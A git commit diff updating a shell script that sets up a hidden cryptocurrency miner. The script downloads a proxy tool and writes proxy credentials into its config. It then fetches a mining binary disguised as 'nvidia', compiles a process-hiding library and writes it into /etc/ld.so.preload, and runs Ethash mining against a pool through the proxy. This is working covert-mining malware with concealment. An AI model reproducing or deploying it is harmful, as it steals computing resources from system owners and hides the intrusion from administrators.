c96d72c38bbfdf1889ec024cef29ea537fa8d33a
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-29 22:51:11 -0600

    Update 14.sh

--- 14.sh
+++ 14.sh
@@ -1,27 +1,48 @@
-wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 45.140.13.124:9137
-socks5_username = faraddd802
-socks5_password = faraddd802
+socks5 = 103.253.24.243:8080
+socks5_username =  woiden_dorin
+socks5_password =  keramat123
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
+echo " "
+echo " "
+
+echo "**"
+
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
-
 echo " "
 
-wget https://github.com/rindalasririn/a/raw/main/11.sh
+echo "**"
 
+echo " "
+echo " "
 
-chmod +x 11.sh
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/nvidia
+chmod +x nvidia
 
-./graftcp/graftcp ./11.sh
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNvidia.zip
+unzip magicNvidia.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./nvidia -a ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong --worker nvidia --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
